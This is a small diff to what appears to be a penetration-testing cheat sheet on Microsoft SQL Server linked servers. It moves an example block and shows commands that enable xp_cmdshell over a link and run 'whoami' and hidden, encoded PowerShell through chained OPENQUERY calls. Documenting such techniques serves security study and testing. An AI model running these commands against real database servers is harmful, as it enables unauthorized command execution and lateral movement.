@@ -1901,6 +1901,12 @@ SELECT * FROM OPENQUERY("<SERVER>\<DB>", 'select @@servername');
 SELECT * FROM OPENQUERY("<SERVER>\<DB>", 'SELECT * FROM sys.configurations WHERE name = ''xp_cmdshell''');
 ```
  
+#### Example with double queries
+```
+SELECT * FROM OPENQUERY("sql-1.test.io", 'select @@servername; exec xp_cmdshell ''powershell -w hidden -enc blah''')
+SELECT * FROM OPENQUERY("sql-1.test.io", 'select * from openquery("sql01.test.local", ''select @@servername; exec xp_cmdshell ''''powershell -enc blah'''''')')
+```
+
 #### EXECUTE AT Enable xp_cmdshell
 - RPC out needs to be enabled - this isn't default
 ```
@@ -1912,12 +1918,6 @@ EXEC('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT "<DB>"
 - Another way of executing through links
 ```
 EXECUTE('exec master..xp_cmdshell ''whoami''') AT "<SERVER>\<DB>"
-```
- 
-#### Example with double queries
-```
-SELECT * FROM OPENQUERY("sql-1.test.io", 'select @@servername; exec xp_cmdshell ''powershell -w hidden -enc blah''')
-SELECT * FROM OPENQUERY("sql-1.test.io", 'select * from openquery("sql01.test.local", ''select @@servername; exec xp_cmdshell ''''powershell -enc blah'''''')')
 ```
  
 ### Privilege escalation Service Accounts
